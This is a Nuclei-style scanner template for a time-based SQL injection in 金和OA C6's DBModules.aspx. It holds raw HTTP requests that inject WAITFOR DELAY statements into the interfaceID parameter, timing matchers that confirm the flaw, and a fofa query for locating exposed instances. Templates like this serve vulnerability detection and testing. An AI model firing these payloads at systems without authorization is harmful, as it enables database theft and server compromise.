id: jinheOA-C6-DBModules_aspx-sql

info:
  name: 金和OA C6 DBModules.aspx SQL延时注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
    金和OA C6 DBModules.aspx接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486835&idx=1&sn=7d72c88aa52322bd09ab08c058513509&chksm=c267b840f51031568c3494cca4a9f84a8c2c61ae25f26786e5bc61f060c45cd6b7cc69f419c5&token=522460222&lang=zh_CN#rd
  tags: sql injection


http:
  - raw:
      - |
        GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0

      - |
        GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and



